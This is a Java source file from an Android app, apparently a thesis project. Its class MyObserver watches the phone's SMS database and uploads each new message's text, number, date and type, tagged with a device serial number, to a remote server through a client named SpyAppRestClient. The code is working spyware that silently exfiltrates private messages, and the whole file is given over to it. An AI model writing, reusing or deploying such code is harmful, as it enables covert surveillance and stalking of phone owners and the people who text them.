package com.example.natalia.super_inzynierka;

import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;
import cz.msebera.android.httpclient.Header;

import java.lang.reflect.Type;
import java.util.*;

/**
 * Created by Natalia on 11.01.2017.
 */
class MyObserver extends ContentObserver {
    private static String serialNr = StartService.serialNr;
    private static final Uri uri = Uri.parse("content://sms");
    private String lastSMS = "";
    private long lastDate = 0;
    private boolean getAndUpdate;

    private ArrayList<String> listMessageBody;
    private ArrayList<String> listNumber;
    private ArrayList<String> listDate;
    private ArrayList<String> listPosition;

    private String response_message = "";

    MyObserver(Handler handler) {
        super(handler);
        serialNr = StartService.serialNr;
        listMessageBody = new ArrayList<>();
        listNumber = new ArrayList<>();
        listDate = new ArrayList<>();
        listPosition = new ArrayList<>();
        getAndUpdate = false;
        getRequest("list_message/");
        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                getAndUpdate();
            }
        }, 3 * 1000);
    }


    @Override
    public void onChange(boolean selfChange) {
        Cursor cursor = null;
        String type;
        int path;

        try {
            cursor = StartService.contentResolver.query(uri, null, null, null, null);
            if (cursor != null) {
                if (getAndUpdate && listPosition.size() != 0 && !response_message.equals("")) {
                    path = 1;
                    boolean is;
                    cursor.moveToLast();
                    int lastPosition = cursor.getPosition();
                    if (lastPosition > 50) lastPosition = 50;
                    for (int x = 0; x <= lastPosition; x++) {
                        cursor.moveToPosition(x);
                        is = false;
                        for (int i = 0; i < listPosition.size(); i++) {
                            if (cursor.getString(cursor.getColumnIndex("_id")).equals(listPosition.get(i))) {
                                is = true;
                            }
                        }
                        if (!is) {
                            String body = cursor.getString(cursor.getColumnIndex("body"));
                            String number = cursor.getString(cursor.getColumnIndex("address"));
                            String date = displayTime(cursor.getString(cursor.getColumnIndex("date")));
                            String position = cursor.getString(cursor.getColumnIndex("_id"));
                            type = cursor.getString(cursor.getColumnIndex("type"));
                            if (smsChecker("Number " + number + ": " + body, cursor.getString(cursor.getColumnIndex("date")), path)) {
                                listMessageBody.add(listMessageBody.size(), body);
                                listNumber.add(listNumber.size(), number);
                                listDate.add(listDate.size(), date);
                                listPosition.add(listPosition.size(), position);
                                postRequest(number, date, body, serialNr, position, type);
                            }
                        }
                    }

                } else if (cursor.moveToFirst()) {
                    path = 2;
                    cursor.moveToFirst();

                    String smsText = cursor.getString(cursor.getColumnIndex("body"));
                    String smsNumber = cursor.getString(cursor.getColumnIndex("address"));
                    String smsDate = cursor.getString(cursor.getColumnIndex("date"));
                    type = cursor.getString(cursor.getColumnIndex("type"));

                    if (smsChecker("Number " + smsNumber + ": " + smsText, smsDate, path)) {
                        listMessageBody.add(listMessageBody.size(), smsText);
                        listNumber.add(listNumber.size(), smsNumber);
                        listDate.add(listDate.size(), displayTime(smsDate));
                        listPosition.add(listPosition.size(), cursor.getString(cursor.getColumnIndex("_id")));
                        postRequest(smsNumber, displayTime(smsDate), smsText, serialNr, cursor.getString(cursor.getColumnIndex("_id")), type);

                    }
                }
            }
        } finally {
            if (cursor != null)
                cursor.close();
        }
    }

    private boolean smsChecker(String sms, String date, int path) {
        Long dateLong = Long.parseLong(date);
        boolean flagSMS = true;
        switch (path) {
            case 1:
                if (sms.equals(lastSMS)) {
                    flagSMS = false;
                } else {
                    lastSMS = sms;
                    lastDate = dateLong;
                }
                break;
            case 2:
                if (sms.equals(lastSMS) || dateLong < lastDate) {
                    flagSMS = false;
                } else {
                    lastSMS = sms;
                    lastDate = dateLong;
                }
                break;
        }
        return flagSMS;
    }

    private void getAndUpdate() {
        int clickCounter = 0;

        Gson gson = new Gson();
        if (!response_message.equals("")) {
            Type type2 = new TypeToken<List<Messages>>() {
            }.getType();
            List<Messages> messagesList = gson.fromJson(response_message, type2);
            for (Messages messages : messagesList) {
                if (messages.log.equals(serialNr)) {
                    listMessageBody.add(clickCounter, messages.text);
                    listNumber.add(clickCounter, messages.number);
                    listDate.add(clickCounter, messages.start_time);
                    listPosition.add(clickCounter, messages.position);
                    clickCounter = clickCounter + 1;
                }
            }
        }
        getAndUpdate = true;
    }

    private void postRequest(final String number, final String date, final String text, final String serialNumber, final String position, final String state) {
        RequestParams params = new RequestParams();
        params.put("number", number);
        params.put("start_time", date);
        params.put("text", text);
        params.put("log", serialNumber);
        params.put("position", position);
        params.put("type", state);
        SpyAppRestClient.post("create_message/", params, new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
            }
        });
    }

    private void getRequest(String url) {
        SpyAppRestClient.get(url, null, new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                if (responseBody == null) {
                    return;
                }
                response_message = new String(responseBody);
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                if (responseBody == null) {
                    return;
                }
                response_message = new String(responseBody);

            }
        });
    }

    private String displayTime(String smsDate) {
        long date = Long.parseLong(smsDate);
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(date);

        String min;
        String month;
        String day;
        int mYear = calendar.get(Calendar.YEAR);
        int mMonth = calendar.get(Calendar.MONTH);
        int mDay = calendar.get(Calendar.DAY_OF_MONTH);
        int hour = calendar.get(Calendar.HOUR_OF_DAY);
        int minute = calendar.get(Calendar.MINUTE);
        mMonth = mMonth + 1;

        min = Integer.toString(minute);
        if (minute < 10) min = "0" + minute;
        month = Integer.toString(mMonth);
        if (mMonth < 10) month = "0" + mMonth;
        day = Integer.toString(mDay);
        if (mDay < 10) day = "0" + mDay;
        return day + "-" + month + "-" + mYear + "  " + hour + ":" + min;
    }
}
